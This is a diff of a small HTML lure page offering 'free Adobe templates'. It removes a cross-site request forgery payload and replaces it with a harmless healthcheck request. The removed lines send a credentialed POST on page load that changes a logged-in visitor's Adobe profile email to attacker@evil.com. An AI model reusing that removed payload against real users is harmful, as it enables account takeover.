@@ -1,19 +1,20 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <h1>Free Adobe Acrobat Templates!</h1>
+  <h1>Free Adobe Templates!</h1>
+  <p>Loading your gift...</p>
+  
   <script>
-    fetch("https://dc-api.adobe.io/user/update_profile", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        "name": "HACKED USER",
-        "email": "attacker@evil.com" 
-      }),
-      credentials: "include"
+    // Simple test to verify the page works
+    alert("Page loaded successfully!");
+    
+  
+    fetch("https://dc-api.adobe.io/healthcheck", {
+      method: "GET",
+      headers: { "Content-Type": "application/json" }
     })
-    .then(res => alert("Profile changed! Status: " + res.status))
-    .catch(err => alert("Error: " + err));
+    .then(res => console.log("API status:", res.status))
+    .catch(err => console.error("API error:", err));
   </script>
 </body>
 </html>
